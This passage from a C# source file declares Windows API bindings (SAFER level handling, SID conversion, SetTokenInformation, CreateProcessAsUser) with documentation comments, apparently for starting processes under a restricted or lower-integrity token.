        /// <param name="hLevelHandle">The handle to the SAFER level to be closed.</param>
        /// <returns>True if the handle is closed successfully; otherwise, false.</returns>
        [DllImport("advapi32", SetLastError = true)]
        private static extern bool SaferCloseLevel(IntPtr hLevelHandle);

        /// <summary>
        /// Converts a string representation of a security identifier (SID) to a binary SID and returns a value indicating whether the conversion was successful.
        /// </summary>
        /// <param name="StringSid">The string representation of the SID to be converted.</param>
        /// <param name="ptrSid">When this method returns, contains the pointer to the binary SID if the conversion was successful; otherwise, null.</param>
        /// <returns>True if the conversion was successful and the <paramref name="ptrSid"/> parameter contains the pointer to the binary SID; otherwise, false.</returns>
        /// <exception cref="System.ComponentModel.Win32Exception">Thrown when the conversion fails and the last Win32 error is set.</exception>
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool ConvertStringSidToSid(string StringSid, out IntPtr ptrSid);

        /// <summary>
        /// Closes an open object handle.
        /// </summary>
        /// <param name="hObject">A handle to an open object.</param>
        /// <returns>True if the function succeeds, false if the function fails. To get extended error information, call GetLastError.</returns>
        /// <remarks>
        /// This method closes an open object handle. If the function succeeds, the return value is true. If the function fails, the return value is false. To get extended error information, call GetLastError.
        /// </remarks>
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        /// <summary>
        /// Safely closes the specified handle if it is not a null pointer and returns a boolean value indicating the success of the operation.
        /// </summary>
        /// <param name="hObject">The handle to be closed.</param>
        /// <returns>True if the handle is a null pointer or if the operation to close the handle is successful; otherwise, false.</returns>
        /// <remarks>
        /// This method checks if the input handle <paramref name="hObject"/> is a null pointer. If it is, the method returns true indicating that the handle is already closed.
        /// If the handle is not a null pointer, the method attempts to close the handle using the CloseHandle function and returns true if the operation is successful; otherwise, it returns false.
        /// </remarks>
        private static bool SafeCloseHandle(IntPtr hObject)
        {
            return (hObject == IntPtr.Zero) ? true : CloseHandle(hObject);
        }

        /// <summary>
        /// Frees the memory block allocated by LocalAlloc and LocalReAlloc and invalidates the handle.
        /// </summary>
        /// <param name="hMem">A handle to the local memory object.</param>
        /// <returns>If the function succeeds, the return value is NULL. If the function fails, the return value is equal to a handle to the local memory object. To get extended error information, call GetLastError.</returns>
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        /// <summary>
        /// Sets the token information for a specified token.
        /// </summary>
        /// <param name="TokenHandle">A handle to the access token for which information is to be set.</param>
        /// <param name="TokenInformationClass">The type of information being assigned to the access token.</param>
        /// <param name="TokenInformation">A pointer to a buffer that contains the token information to set.</param>
        /// <param name="TokenInformationLength">The length, in bytes, of the buffer pointed to by the TokenInformation parameter.</param>
        /// <returns>True if the function succeeds, otherwise False.</returns>
        /// <remarks>
        /// This method sets the specified token information for a given access token using the advapi32.dll library.
        /// The SetLastError property is set to true, indicating that the function will call the SetLastError method to record the last Win32 error.
        /// </remarks>
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern Boolean SetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            UInt32 TokenInformationLength);

        const uint SE_GROUP_INTEGRITY = 0x00000020;

        /// <summary>
        /// Creates a new process using the specified user token and startup information.
        /// </summary>
        /// <param name="hToken">A handle to the primary token that represents a user.</param>
        /// <param name="lpApplicationName">The name of the module to be executed.</param>
        /// <param name="lpCommandLine">The command line to be executed.</param>
        /// <param name="lpProcessAttributes">A pointer to a SECURITY_ATTRIBUTES structure for the new process object.</param>
        /// <param name="lpThreadAttributes">A pointer to a SECURITY_ATTRIBUTES structure for the new thread object.</param>
        /// <param name="bInheritHandles">If this parameter is true, each inheritable handle in the calling process is inherited by the new process.</param>
        /// <param name="dwCreationFlags">The flags that control the priority class and the creation of the process.</param>
        /// <param name="lpEnvironment">A pointer to an environment block for the new process.</param>
        /// <param name="lpCurrentDirectory">The full path to the current directory for the process.</param>
        /// <param name="lpStartupInfo">A pointer to a STARTUPINFO structure that specifies how the application is to be shown.</param>
        /// <param name="lpProcessInformation">A pointer to a PROCESS_INFORMATION structure that receives identification information about the new process.</param>
        /// <returns>True if the function succeeds, false if it fails. To get extended error information, call GetLastError.</returns>
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessAsUser(
            IntPtr hToken,
            string lpApplicationName,
            StringBuilder lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);
    }
}